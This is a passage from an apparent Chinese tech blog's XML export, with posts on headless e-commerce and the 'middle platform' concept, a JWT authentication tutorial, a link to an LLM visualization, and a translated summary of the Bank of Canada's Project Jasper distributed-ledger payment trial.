    <content><![CDATA[<p>Headless Commerce是一个有趣的名字，它是近一年国外电商行业的时髦术语。国内还不怎么流行这种叫法，但与其对应类似的概念实际上在中国也是漫天飞舞，这就是“API化”和“中台”说法。想到中台的火热，我也随手记下这篇文章，聊聊无头电商和中台。</p>
<h3 id="什么是无头电商？"><a href="#什么是无头电商？" class="headerlink" title="什么是无头电商？"></a>什么是无头电商？</h3><p>Headleass Commerce可以翻译成<strong>无头电商</strong>，或<strong>断头电商</strong>，核心概念就是将前台展现和后台服务进行解耦的一种架构。后台以API的方式提供服务，前端展现层与后端分离。没有前端表现层（头），剩下的就是无头电商了，剩下的就是一堆API接口。</p>
<p>写过代码的程序员都很容易理解，这不就是前后端分离，或面向服务架构(SOA)么？为什么这么简单的事情，会成为电商行业的噱头呢？其实，这个事情后面有很多深层次的原因，有商业原因，有电商演进历史，有生态原因，有品牌主新需求等等。</p>
<p><img src="/2019/08/19/Headless-Commerce-%E6%97%A0%E5%A4%B4%E7%94%B5%E5%95%86%E4%B8%8E%E4%B8%AD%E5%8F%B0%E9%9A%8F%E6%83%B3/ar.png"></p>
<h3 id="为什么会发生这种变化"><a href="#为什么会发生这种变化" class="headerlink" title="为什么会发生这种变化?"></a>为什么会发生这种变化?</h3><p>有几个事情比较重要：</p>
<ol>
<li>品牌主建立自有电商的需求</li>
</ol>
<ul>
<li><p>国内外电商平台虽然都已经寡头化，美国有亚马逊，中国有京东淘宝，很多品牌主依旧努力建立自有电商渠道，不断突围。</p>
</li>
<li><p>品牌主建立自有平台可以加强自有数据的把控能力，直接与消费者进行互动，保证独有体验。</p>
</li>
</ul>
<ol start="2">
<li>电商体验的多样化</li>
</ol>
<ul>
<li><p>电商不在是一个简单Web端，电商行业出现很多新触点：语音购物，无人超市，场景购物等，前端变得更加丰富多样</p>
</li>
<li><p>底层的基础能力相对稳定，底层可以利用API确保稳定</p>
</li>
</ul>
<ol start="3">
<li>品牌直接面对消费者（Brand Direct To Consumer)</li>
</ol>
<ul>
<li><p>很多互联网品牌通过创新的电商方式直接面对消费者，消除传统的中间环节（零售商，批发商等）</p>
</li>
<li><p>一些私域流量给DTC创造了很多创新机会，最后这些创新场景都需要落地电商平台上。</p>
</li>
</ul>
<ol start="4">
<li>电商平台的演化</li>
</ol>
<ul>
<li>一体式的电商解决方案：从交易到内容，往往是一家巨型供应商提供，比如Oracle , SAP， WordPress等</li>
<li>内容和交易能力的一些分离，出现了CMS或DXP的独立功能区域</li>
<li>无头电商：以API为基础的构建方式，前后端分离，通过API支持更广泛的生态</li>
</ul>
<p><img src="/2019/08/19/Headless-Commerce-%E6%97%A0%E5%A4%B4%E7%94%B5%E5%95%86%E4%B8%8E%E4%B8%AD%E5%8F%B0%E9%9A%8F%E6%83%B3/types.png"></p>
<p>这种无头商务平台脱离了通常模板化的系统前端，允许开发人员在任何类型的框架中为产品和服务创建各种接触点。这样，后端开发人员就可以灵活地创建和使用应用程序编程接口（API），以便交付给任何类型的设备，而不仅仅是标准屏幕。</p>
<h3 id="无头商务与传统商业有什么区别？"><a href="#无头商务与传统商业有什么区别？" class="headerlink" title="无头商务与传统商业有什么区别？"></a>无头商务与传统商业有什么区别？</h3><p>传统平台为客户和业务提供了模板化的体验，缺少自由风格的发挥空间，通过无头商务，可以更好地控制商务平台、客户业务和用户体验。</p>
<p><img src="/2019/08/19/Headless-Commerce-%E6%97%A0%E5%A4%B4%E7%94%B5%E5%95%86%E4%B8%8E%E4%B8%AD%E5%8F%B0%E9%9A%8F%E6%83%B3/diff.png"></p>
<h3 id="结论"><a href="#结论" class="headerlink" title="结论"></a>结论</h3><p>无头电商的好处本质上都来源于前后端的解耦，面向服务和API的架构。<strong>后端可以聚焦在沉淀，前后端可以利用API进行交互，以实现更多的应用场景。</strong> </p>
<ol>
<li>无头商务是迎接物联网时代（IoT）而创建的对应一些新零售场景，特别是没有任何屏幕的场景，如何通过语音，视频，手势等方式与消费者完成商业互动，其中也包括在户外，汽车等不同场地。</li>
<li>API 是数据流动的管道<br>无头电商也是未来数据收集，分析，管理的技术架构的基础。传统的单体电商产品，往往不能实现数据的灵活对流。</li>
<li>快速发布<br>各模块的解耦使得各个模块可以独立升级和发布，各个模块可以采用微服务技术独立发布，只需要保持接口的稳定和兼容。新的功能可以通过增加新的接口，新的场景可以驱动这些新接口的集成。例如，我们需要更换支付服务商，我们只需调用一个新的接口实现者就行，原则上不需要大更改，所有上层应用都不受影响。</li>
<li>个性化<br>无头电商是模块化和灵活的，各个模块API可以进行灵活的组合，封装，二次开发等。很多个性化的策略可以灵活应用在无头电商的各个环节当中。例如，消费者画像也可以作为标准模块，提供给各个模块使用，最大程度复用沉淀的洞察。</li>
<li>扩展性和稳定性<br>稳定性，可扩展性和性能对电子商务系统非常重要，因为它们可以直接影响客户的购买行为。如果出现意外的后端故障，如果后端和前端断开连接，后者仍然可用。后端和前端可以独立地进行水平扩展和垂直扩展。</li>
</ol>
<h3 id="无头电商和中台"><a href="#无头电商和中台" class="headerlink" title="无头电商和中台"></a>无头电商和中台</h3><p>说到这里，无头电商和中国热火朝天讨论的中台（Platform）的理念非常类似：大中台，小前台； </p>
<p><strong>大中台：本质上是沉淀能力，利用API提高复用性；小前台：本质上是快速迭代和试错。</strong>这个逻辑其实是和Gartner2015提出的Pace-Layerd 应用战略是一致的，当时Garnter根据系统的变化速度分为 “创新型” ，”差异型”，”稳定型”几种。</p>
<p>数据中台其实就是保持接口稳定的一个系统，支持快速创新的业务层。</p>
<p><img src="/2019/08/19/Headless-Commerce-%E6%97%A0%E5%A4%B4%E7%94%B5%E5%95%86%E4%B8%8E%E4%B8%AD%E5%8F%B0%E9%9A%8F%E6%83%B3/gar.png"></p>
<h3 id="中台的一些困惑和随想"><a href="#中台的一些困惑和随想" class="headerlink" title="中台的一些困惑和随想"></a>中台的一些困惑和随想</h3><p>在中国，中台已经流行几年了，仔细想想，中台本质也是一种无头。无头电商是中台概念在一个具体行业的应用。<strong>沉淀</strong>和<strong>复用</strong>是很多公司的不同阶段都会碰到的，中台战略是解决这个问题的某种形式。很多大大小小公司开始组建中台攻坚团队，我与很多朋友都聊过中体的经历，大大小小都会碰到一下一些困惑。例如，一个公司在推进中台战略中，单点登录是唯一成功的案例，其它中台能力的推广都是很难，每个业务线都有自己研发，不喜欢别人轮子。</p>
<p><img src="/2019/08/19/Headless-Commerce-%E6%97%A0%E5%A4%B4%E7%94%B5%E5%95%86%E4%B8%8E%E4%B8%AD%E5%8F%B0%E9%9A%8F%E6%83%B3/dev.png"></p>
<p><strong>1) 中台和前台的界限无法界定清楚</strong>。中台实现两个能力，一个是沉淀，另外是复用； 二者相辅相成。前台更加面向客户，他们更加容易最快速度创造客户价值和商业价值。</p>
<p>如何衡量这种花费是否合理？ 一种衡量的方法是：对每个新业务，评估一下中台支持的粒度和程度，如果对于中台的范畴，大家都没有太大歧义，这么这种解耦可能是合理的。如果对于每个新业务，大家都要对范围界定进行激烈讨论，那么大家还是需要一个更加清晰的中台定位。</p>
<p><strong>2) 中台的成功无法衡量和量化</strong></p>
<p>那么如何衡量中台的成绩和成功呢？很多时候这个成绩是没有办法衡量的，但是无法量化的东西，是无法改进的。因此，很多中台的战略都是至上而下的组织形态优化。</p>
<p>具体量化的时候，我们常常有两个思路：a) 中台能力被使用了的范围和深度 ，例如API调用次数，业务使用量，依赖强度等；b) 中台帮助那些业务提升了效率和效益，提升比例等。量化这些指标常常是短期的行为，中台建设也包括一些创新的投资，以及中长期的数据能力沉淀。</p>
<p><strong>3) 产品经理在中台战略的新挑战</strong></p>
<p>大多产品经理喜欢参与2C的产品设计，小一部分产品经理深入2B的产品设计。中台涉及很多技术逻辑，涉及到业务底层实现，涉及到公司多个部门的协同共赢，能够胜任这种角色的产品经理，少之又少，大部分都是由研发主管兼任，或者是项目经理类似角色担当。</p>
<p>中台产品经理比较靠近2B/2D的产品经理，但是更加面向内部多种业务，面向综合效率提升，面向技术架构，也需要很强的商业化的思考。</p>
<p><img src="/2019/08/19/Headless-Commerce-%E6%97%A0%E5%A4%B4%E7%94%B5%E5%95%86%E4%B8%8E%E4%B8%AD%E5%8F%B0%E9%9A%8F%E6%83%B3/2b2c2d.png"></p>
<p><strong>4)  数据中台越来越重要</strong></p>
<p>大部分公司都有独立的数据平台团队，但各业务线对数据都有自己的解读。在每一个时刻，数据中台需要有自己清楚的定位，这个定位需要让所有业务都清楚了解。如果定位有任何变化，这种变化需要提前通知到各个业务线。</p>
<p>现实中，各个业务线都会发展自己的数据应用能力，数据分析能力，这些分析需要定期的沉淀到数据中台。</p>
<p><strong>5)  中台需要面向开发者，与理解数据逻辑的业务人员的</strong></p>
<p>中台不是华丽的界面和装修，而是底层的脊梁和砖头。中台的能力，必须由业务团队使用（逻辑上理解），程序员使用（利用API调用）。 </p>
<p>如果中台直接面向业务的运营，很可能是不成功的。因为，运营很多时候具有快节奏的变化，缺少稳定性，运营平台更像是一种中台的上层应用。另外，运营在使用中台时候，缺少工程师对于API的一些理解，也不利于中台的接口完善和发展。</p>
<p><img src="/2019/08/19/Headless-Commerce-%E6%97%A0%E5%A4%B4%E7%94%B5%E5%95%86%E4%B8%8E%E4%B8%AD%E5%8F%B0%E9%9A%8F%E6%83%B3/frontend.png"></p>
<p><em>前台团队中有程序员，才能最大程度发挥中台的作用。</em></p>
<p><strong>6) 中台是需要运营的，面向中台服务的技术运营</strong></p>
<p>运营可以成为中台和前台的润滑剂，保证前台和中台之间的顺畅。在一些大型的公司，中台能力甚至需要一些主动的推广，确保整个组织能够真正从中台中收益，并且为中台也做贡献。</p>
<p><img src="/2019/08/19/Headless-Commerce-%E6%97%A0%E5%A4%B4%E7%94%B5%E5%95%86%E4%B8%8E%E4%B8%AD%E5%8F%B0%E9%9A%8F%E6%83%B3/ops.png"></p>
<h3 id="无头电商的技术方案"><a href="#无头电商的技术方案" class="headerlink" title="无头电商的技术方案"></a>无头电商的技术方案</h3><p>说了这么多中台，看起来有些跑题了，回到无头电商的一些技术，其中有些技术很多技术中台都可以采用。</p>
<p><strong>1）CMS支持无头电商的产品：</strong></p>
<ul>
<li>Contentful (非常流行, 基于API的内容管理系统)</li>
<li>Adobe Experience Manager (企业级别体验管理平台)</li>
<li>Amplience (企业级别体验管理平台，支持无头电商)</li>
<li>Acquia (企业级别体验管理平台，支持无头电商)</li>
<li>Kentico （中型内容管理平台)</li>
<li>Sitecore (企业级别内容管理平台)</li>
<li>Prismic (面向API的CMS)</li>
<li>Gatsby (基于react的PWA 框架)</li>
<li>Vuestorefront (基于vue.js的PWA 框架)</li>
<li>Deity (基于react.js的 PWA 框架)</li>
</ul>
<p><strong>2）支持无头电商的系统</strong></p>
<ul>
<li>CommerceTools﻿</li>
<li>ElasticPath（用途比较广的电商平台，支持丰富API）</li>
<li>Moltin（主打API模式的电商平台）</li>
<li>Magento （2018年5月被Adobe收购，整合在Adobe Commerce Cloud中，支持与Adobe其它软件整合）</li>
<li>BigCommerce（主打无头电商）</li>
<li>SAP CX Commerce Cloud （优势在后端 如CRM/ERP等，支持通过API模式与不同的前端整合）</li>
<li>OroCommerce (B2B的电商平台)</li>
<li>Spryker</li>
</ul>
<p> <strong>3） 无头电商的API标准：</strong></p>
<ul>
<li><p><strong>OCAPI (Open Commerce API)：</strong></p>
<p>  这个标准是Salesforce提供的电商API，渐渐成为电商行业的开放标准，Magento，SiteCore等系统能比较好支持这个协议。Salesforce在对接标准和开放程度上走在行业领先地位，这也是大家看好它的重要原因。</p>
</li>
<li><p><strong>JSS(Javascript Services)</strong><br>  SiteCore利用Javascript提供的API能力，SiteCore也越来越开放</p>
</li>
</ul>
<p><img src="/2019/08/19/Headless-Commerce-%E6%97%A0%E5%A4%B4%E7%94%B5%E5%95%86%E4%B8%8E%E4%B8%AD%E5%8F%B0%E9%9A%8F%E6%83%B3/sitecore.png"></p>
<p>  **4） 扩展性的前端技术：  **</p>
<ul>
<li>JAMStack<br>  这是一个非常有趣的架构，企图颠覆传统三层架构：静态元素放在CDN上，动态数据利用Service/API进行交互。JAMstack将复杂问题分解为动态和静态部分。</li>
</ul>
<p><img src="/2019/08/19/Headless-Commerce-%E6%97%A0%E5%A4%B4%E7%94%B5%E5%95%86%E4%B8%8E%E4%B8%AD%E5%8F%B0%E9%9A%8F%E6%83%B3/jam.png"></p>
<ul>
<li><p>PWA（Progressive Web Apps)</p>
<p>  把网页开发成像本地应用一样的技术，可以媲美原生用户体验，包括离线可用，后台推送等功能。类似微信的小程序技术，只不过PWA是浏览器里的小程序。PWA梦想很美好，现实很残酷。PWA的技术也在被各种平台内的技术所代替。</p>
</li>
<li><p>GraphQL</p>
<p>一种面向API的理想主义查询语言；传统API需要严格规定参数和格式，GraphQL提供了一些API的查询和归一化能力，使得API开发更加方便和具有扩展性。它比REST更加灵活。一些都是接口，一切都是可描述的。</p>
</li>
</ul>
<p><img src="/2019/08/19/Headless-Commerce-%E6%97%A0%E5%A4%B4%E7%94%B5%E5%95%86%E4%B8%8E%E4%B8%AD%E5%8F%B0%E9%9A%8F%E6%83%B3/graphql.png"></p>
<h3 id="无头电商的缺点"><a href="#无头电商的缺点" class="headerlink" title="无头电商的缺点"></a>无头电商的缺点</h3><p><strong>1) 复杂性的增加</strong></p>
<p>单体模式依旧是最简单模式，无头电商将失去这种简单，进入一个复杂的技术世界。幸运的是，现在的软件技术和云技术都可以更好的处理这些复杂度，当然这也涉及到技术思维的升级。。</p>
<p><strong>2) 成本的增加</strong></p>
<p>无头电商的推广和实施往往需要时间和耐心。从经验来看，无头电子商务实施通常会产生成本开销（由于需要更多开发）；集成也会更加复杂 ，其中会涉及到更多的第三方供应商。</p>
<p>那么，如何管理这种复杂度和有效管理成本？有几点可能会有帮助：</p>
<p>1）加强数据团队和云技术人才，增强管理技术复杂度的能力</p>
<p>2）业务驱动的演化路径，一步步的演化系统架构，更好的系统架构要更加快速尝试更多的业务场景</p>
<p>3）积极利用公有云基础架构，少造轮子，持续优化</p>
<p>参考连接：</p>
<p><a href="https://paulnrogers.com/introduction-to-headless-ecommerce/">https://paulnrogers.com/introduction-to-headless-ecommerce/</a></p>
<p><a href="https://www.sparkred.com/blog/michael-kors-case-study-a-journey-to-headless-commerce/">https://www.sparkred.com/blog/michael-kors-case-study-a-journey-to-headless-commerce/</a></p>
<p><a href="https://www.ipraxa.com/blog/headless-ecommerce-guide/">https://www.ipraxa.com/blog/headless-ecommerce-guide/</a></p>
<p><a href="https://jss.sitecore.com/features">https://jss.sitecore.com/features</a></p>
<p><a href="https://www.bigcommerce.com/blog/headless-commerce/">https://www.bigcommerce.com/blog/headless-commerce/</a></p>
<p><a href="https://www.degdigital.com/insights/headless-architecture-digital-experiences/">https://www.degdigital.com/insights/headless-architecture-digital-experiences/</a></p>
<p><a href="https://www.bigcommerce.com/blog/flexible-headless-commerce-solutions/">https://www.bigcommerce.com/blog/flexible-headless-commerce-solutions/</a></p>
<p><a href="https://www.jianshu.com/p/a88b80d88284">https://www.jianshu.com/p/a88b80d88284</a></p>
<p>作者介绍：<strong>欧阳辰</strong>，品友互动，CTO，《Druid实时大数据分析》书作者，《构建高质量的软件》译者，超过17年的互联网老兵。</p>
<p><img src="/2019/08/19/Headless-Commerce-%E6%97%A0%E5%A4%B4%E7%94%B5%E5%95%86%E4%B8%8E%E4%B8%AD%E5%8F%B0%E9%9A%8F%E6%83%B3/author.png"></p>
]]></content>
      <tags>
        <tag>电商</tag>
      </tags>
  </entry>
  <entry>
    <title>JSON WEB TOKEN 介绍</title>
    <url>/2018/07/26/JSON-WEB-TOKEN-%E4%BB%8B%E7%BB%8D/</url>
    <content><![CDATA[<p>JSON Web Token（缩写 JWT）是目前最流行的跨域认证解决方案。</p>
<h4 id="一、跨域认证的问题"><a href="#一、跨域认证的问题" class="headerlink" title="一、跨域认证的问题"></a>一、跨域认证的问题</h4><p>互联网服务离不开用户认证。一般流程是下面这样。</p>
<blockquote>
<ol>
<li>用户向服务器发送用户名和密码。</li>
<li>服务器验证通过后，在当前对话（session）里面保存相关数据，比如用户角色、登录时间等等。</li>
<li>服务器向用户返回一个 session_id，写入用户的 Cookie。</li>
<li>用户随后的每一次请求，都会通过 Cookie，将 session_id 传回服务器。</li>
<li>服务器收到 session_id，找到前期保存的数据，由此得知用户的身份。</li>
</ol>
</blockquote>
<p>这种模式的问题在于，扩展性（scaling）不好。单机当然没有问题，如果是服务器集群，或者是跨域的服务导向架构，就要求 session 数据共享，每台服务器都能够读取 session。</p>
<p>举例来说，A 网站和 B 网站是同一家公司的关联服务。现在要求，用户只要在其中一个网站登录，再访问另一个网站就会自动登录，请问怎么实现？</p>
<p>一种解决方案是 session 数据持久化，写入数据库或别的持久层。各种服务收到请求后，都向持久层请求数据。这种方案的优点是架构清晰，缺点是工程量比较大。另外，持久层万一挂了，就会单点失败。</p>
<p>另一种方案是服务器索性不保存 session 数据了，所有数据都保存在客户端，每次请求都发回服务器。JWT 就是这种方案的一个代表。</p>
<h4 id="二、JWT-的原理"><a href="#二、JWT-的原理" class="headerlink" title="二、JWT 的原理"></a>二、JWT 的原理</h4><p>JWT 的原理是，服务器认证以后，生成一个 JSON 对象，发回给用户，就像下面这样。</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  <span class="string">&quot;姓名&quot;</span>: <span class="string">&quot;张三&quot;</span>,</span><br><span class="line">  <span class="string">&quot;角色&quot;</span>: <span class="string">&quot;管理员&quot;</span>,</span><br><span class="line">  <span class="string">&quot;到期时间&quot;</span>: <span class="string">&quot;2018年7月1日0点0分&quot;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>以后，用户与服务端通信的时候，都要发回这个 JSON 对象。服务器完全只靠这个对象认定用户身份。为了防止用户篡改数据，服务器在生成这个对象的时候，会加上签名（详见后文）。</p>
<p>服务器就不保存任何 session 数据了，也就是说，服务器变成无状态了，从而比较容易实现扩展。</p>
<h4 id="三、JWT-的数据结构"><a href="#三、JWT-的数据结构" class="headerlink" title="三、JWT 的数据结构"></a>三、JWT 的数据结构</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c</span><br></pre></td></tr></table></figure>
<p>它是一个很长的字符串，中间用点（.）分隔成三个部分。注意，JWT 内部是没有换行的，这里只是为了便于展示，将它写成了几行。</p>
<p>JWT 的三个部分依次如下:</p>
<ul>
<li>Header（头部）</li>
<li>Payload（负载）</li>
<li>Signature（签名）</li>
</ul>
<p>写成一行，就是下面的样子。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Header.Payload.Signature</span><br></pre></td></tr></table></figure>
<p>下面依次介绍这三个部分。</p>
<h5 id="3-1-Header"><a href="#3-1-Header" class="headerlink" title="3.1 Header"></a>3.1 Header</h5><p>Header 部分是一个 JSON 对象，描述 JWT 的元数据，通常是下面的样子。</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  <span class="string">&quot;alg&quot;</span>: <span class="string">&quot;HS256&quot;</span>,</span><br><span class="line">  <span class="string">&quot;typ&quot;</span>: <span class="string">&quot;JWT&quot;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>上面代码中，alg属性表示签名的算法（algorithm），默认是 HMAC SHA256（写成 HS256）；typ属性表示这个令牌（token）的类型（type），JWT 令牌统一写为JWT。</p>
<p>最后，将上面的 JSON 对象使用 Base64URL 算法（详见后文）转成字符串。</p>
<h5 id="3-2-Payload"><a href="#3-2-Payload" class="headerlink" title="3.2 Payload"></a>3.2 Payload</h5><p>Payload 部分也是一个 JSON 对象，用来存放实际需要传递的数据。JWT 规定了7个官方字段，供选用。</p>
<ul>
<li>iss (issuer)：签发人</li>
<li>exp (expiration time)：过期时间</li>
<li>sub (subject)：主题</li>
<li>aud (audience)：受众</li>
<li>nbf (Not Before)：生效时间</li>
<li>iat (Issued At)：签发时间</li>
<li>jti (JWT ID)：编号</li>
</ul>
<p>除了官方字段，你还可以在这个部分定义私有字段，下面就是一个例子。</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  <span class="string">&quot;sub&quot;</span>: <span class="string">&quot;1234567890&quot;</span>,</span><br><span class="line">  <span class="string">&quot;name&quot;</span>: <span class="string">&quot;John Doe&quot;</span>,</span><br><span class="line">  <span class="string">&quot;admin&quot;</span>: <span class="literal">true</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>注意，JWT 默认是不加密的，任何人都可以读到，所以不要把秘密信息放在这个部分。<br>这个 JSON 对象也要使用 Base64URL 算法转成字符串。</p>
<h5 id="3-3-Signature"><a href="#3-3-Signature" class="headerlink" title="3.3 Signature"></a>3.3 Signature</h5><p>Signature 部分是对前两部分的签名，防止数据篡改。</p>
<p>首先，需要指定一个密钥（secret）。这个密钥只有服务器才知道，不能泄露给用户。然后，使用 Header 里面指定的签名算法（默认是 HMAC SHA256），按照下面的公式产生签名。</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">HMACSHA256(</span><br><span class="line">  base64UrlEncode(header) + <span class="string">&quot;.&quot;</span> +</span><br><span class="line">  base64UrlEncode(payload),</span><br><span class="line">  secret)</span><br></pre></td></tr></table></figure>
<p>算出签名以后，把 Header、Payload、Signature 三个部分拼成一个字符串，每个部分之间用”点”（.）分隔，就可以返回给用户。</p>
<h5 id="3-4-Base64URL"><a href="#3-4-Base64URL" class="headerlink" title="3.4 Base64URL"></a>3.4 Base64URL</h5><p>前面提到，Header 和 Payload 串型化的算法是 Base64URL。这个算法跟 Base64 算法基本类似，但有一些小的不同。</p>
<p>JWT 作为一个令牌（token），有些场合可能会放到 URL（比如 api.example.com/?token=xxx）。Base64 有三个字符+、/和=，在 URL 里面有特殊含义，所以要被替换掉：=被省略、+替换成-，/替换成_ 。这就是 Base64URL 算法。</p>
<h4 id="四、JWT-的使用方式"><a href="#四、JWT-的使用方式" class="headerlink" title="四、JWT 的使用方式"></a>四、JWT 的使用方式</h4><p>客户端收到服务器返回的 JWT，可以储存在 Cookie 里面，也可以储存在 localStorage。</p>
<p>此后，客户端每次与服务器通信，都要带上这个 JWT。你可以把它放在 Cookie 里面自动发送，但是这样不能跨域，所以更好的做法是放在 HTTP 请求的头信息Authorization字段里面。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Authorization: Bearer &lt;token&gt;</span><br></pre></td></tr></table></figure>

<p>另一种做法是，跨域的时候，JWT 就放在 POST 请求的数据体里面。</p>
<h4 id="五、JWT-的几个特点"><a href="#五、JWT-的几个特点" class="headerlink" title="五、JWT 的几个特点"></a>五、JWT 的几个特点</h4><ol>
<li>JWT 默认是不加密，但也是可以加密的。生成原始 Token 以后，可以用密钥再加密一次。</li>
<li>JWT 不加密的情况下，不能将秘密数据写入 JWT。</li>
<li>JWT 不仅可以用于认证，也可以用于交换信息。有效使用 JWT，可以降低服务器查询数据库的次数。</li>
<li>JWT 的最大缺点是，由于服务器不保存 session 状态，因此无法在使用过程中废止某个 token，或者更改 token 的权限。也就是说，一旦 JWT 签发了，在到期之前就会始终有效，除非服务器部署额外的逻辑。</li>
<li>JWT 本身包含了认证信息，一旦泄露，任何人都可以获得该令牌的所有权限。为了减少盗用，JWT 的有效期应该设置得比较短。对于一些比较重要的权限，使用时应该再次对用户进行认证。</li>
<li>为了减少盗用，JWT 不应该使用 HTTP 协议明码传输，要使用 HTTPS 协议传输。</li>
</ol>
<p>参考链接： <a href="https://jwt.io/">https://jwt.io/</a></p>
]]></content>
      <tags>
        <tag>JWT</tag>
      </tags>
  </entry>
  <entry>
    <title>LLM Visualization</title>
    <url>/2023/12/08/LLM%20Visualization/</url>
    <content><![CDATA[<p><a href="https://bbycroft.net/llm">https://bbycroft.net/llm</a></p>
]]></content>
      <tags>
        <tag>AI</tag>
      </tags>
  </entry>
  <entry>
    <title>Jasper项目告诉你-分布式大额支付系统是否可行</title>
    <url>/2018/02/15/Jasper%E9%A1%B9%E7%9B%AE%E5%91%8A%E8%AF%89%E4%BD%A0-%E5%88%86%E5%B8%83%E5%BC%8F%E5%A4%A7%E9%A2%9D%E6%94%AF%E4%BB%98%E7%B3%BB%E7%BB%9F%E6%98%AF%E5%90%A6%E5%8F%AF%E8%A1%8C/</url>
    <content><![CDATA[<p> 翻译：<a href="https://www.bankofcanada.ca/wp-content/uploads/2017/05/fsr-june-2017-chapman.pdf">https://www.bankofcanada.ca/wp-content/uploads/2017/05/fsr-june-2017-chapman.pdf</a></p>
<ul>
<li>分布式账本技术(DLT)通常被称为比特币的基础。DLT提供了一种全新方式进行(和跟踪)金融交易。研究人员正在调查其在金融体系的实用性。</li>
<li>Jasper项目是基于DLT大额支付系统的技术验证。该验证对DLT作为金融系统基础建设技术的成熟度提供了重要见解。</li>
<li>对于大额支付系统等关键的金融市场基础设施(FMI)，目前版本的DLT还无法提供与集中式系统同样的整体能力。然而，与DLT的初始加密货币应用相比，最新版本的DLT已经取得了巨大的进步。</li>
<li>基于DLT的大额支付系统的优势是其可以接入更大的DLT生态市场(可能包括跨境交易)。</li>
</ul>
<h4 id="什么是分布式账本系统？"><a href="#什么是分布式账本系统？" class="headerlink" title="什么是分布式账本系统？"></a>什么是分布式账本系统？</h4><p>比特币在2009年引入分布式账本技术，其后开始流行。比特币是数字货币的代表。交易都记录在账本上，对所有人都是可见的，由分布式的计算机（矿工）维护。这些计算机是系统上的节点，这些节点在创建新交易时更新账本。该账本使用一系列密码学技术记录交易，若干笔交易被封装成块，交易块与块连接在一起，这种账本被称为区块链。<br>区块链是一个突破，它展示了一种方法来维护各方之间的账本，（i）没有人监督该系统；（ii）交易可以可靠地更新并且记录到比特币系统（无需担心其他成员的诚实度）。</p>
<p>通过让矿工解决数学难题来争取获得验证交易块的权利，从而实现分布式账本的“可靠性”更新。第一个完成一个新的区块广播的矿工为其他矿工提供区块，并以该区块创建的新比特币（矿山）作为回报。虽然挖矿很难，但很容易验证。一旦其他节点看到并验证了这个新矿山，新的区块就被添加到链的后面，块中的交易则被认为是正确的，矿工们开始挖掘其他的新交易。节点对新区块达成一致的方式称为共识机制，比特币的共识机制叫做工作证明(PoW)。</p>
<p>虽然比特币系统已具有相当的弹性，但是他有以下几个不足：</p>
<p>（i）所有交易对每个人都是可见的，但是这是违反银行法的，并使某些参与方利益受损;</p>
<p>（ii）在时间和能源方面，挖矿的代价非常高，在受信任的环境中通常不需要它的好处;</p>
<p>（iii）该系统对任何参加者都是匿名开放的。</p>
<p>为了解决上述问题，人们一直在开发比特币的替代品。新的分布式账本系统只允许受限制的可信对手访问。在一些系统中，共识机制被其他方法所取代。在Jasper阶段2中使用的Corda平台，是通过每个参与方都信任的公证节点完成的，并替换PoW。并且，放弃了区块链的链式结构，并将其替换为分布式账本结构，每个节点只能访问必要的数据，减少系统的透明度，为参与者提供更多隐私**。</p>
<p>Jasper流动资金模型(LSM)利用一个定时多边支付结算的队列，如果银行有非紧急付款，将付款存入队列中。在银行提交付款通知后，提交的付款将与其他排队付款一起等待。定时到达时，该队列暂时被锁定，而算法结合所有提交的付款，确定每个银行的净付款并评其流动性。</p>
<p><strong>支付队列本质上是集中的</strong>。关键的问题是如何在DLT系统中实现它，而不是使用传统的集中账本系统。这些技术问题带来了极大的复杂性。</p>
<h4 id="流动资金模型"><a href="#流动资金模型" class="headerlink" title="流动资金模型"></a>流动资金模型</h4><p>Jasper项目的创新解决方案是在Corda平台上加入“吸入/呼出”程序。在”匹配”周期开始之前，银行向队列提交付款。这些付款不会立即添加到账本中，而是付款指令加载到队列中，直到”匹配”周期开始。此时，会发生一系列事件。首先，在“吸入”阶段，向参与匹配周期的所有银行发送通知，要求他们向加拿大银行发送数字存托凭证(DDR)。然后验证每一笔付款并添加到账本中。然后，在“呼出”阶段，”匹配”算法确定付款的全部子集，以净额为基础，在具备可用资金的情况下进行清算。加拿大银行将DDR付款返还给所有参与银行，金额等于他们所提供的金额，加上或减去”匹配”算法完成后的金额。</p>
<p>举例说明，假设有两家银行A和B，在队列中支付对方100美元和90美元。此外，作为吸入阶段的一部分，每家银行都将15美元送到队列中。扣除两次付款后，该算法将向A银行收取10美元，并向B银行支付10美元。鉴于他们在吸入阶段的贡献，在呼出阶段A银行为支付5美元，对B银行为支付25美元。</p>
<p>然后验证这些交易并将其添加到账本中。与算法不匹配的付款保留在队列中。此时开始一个新的匹配周期。在下一个匹配周期结束之前，银行可以自由输入或移除队列中的付款。重复该过程。</p>
<h4 id="效率和金融稳定性风险"><a href="#效率和金融稳定性风险" class="headerlink" title="效率和金融稳定性风险"></a>效率和金融稳定性风险</h4><h4 id="信用和流动性风险"><a href="#信用和流动性风险" class="headerlink" title="信用和流动性风险"></a>信用和流动性风险</h4><p>Jasper平台没有设计信用风险，因为所有的支付都是对中央银行存款的索赔，这是无风险的资产。参与者通过LVTS将现金转入加拿大银行，然后，大额转账系统(LVTS创建DDR，DDR可以在分布式账本平台上交换。总的来说，本设计证明信用上是可兼容的。</p>
<p>Jasper合并了一个模拟现有实时总额结算(RTGS)系统功能的流动资金模型(LSM)，以缓解流动性风险，参与者将对不够充足的DDR进行支付。Jasper流动资金模型(LSM)的性能目前正在使用模拟数据进行测试。预测这些模拟结果还为时尚早，但我们可以报告，迄今为止，还没有看到证据表明在分布式账本上实施LSM会改变其相对于中央系统的使用或性能。基于DLT技术的LSM很可能可以做出与现有LSM类似的流动性资金系统。</p>
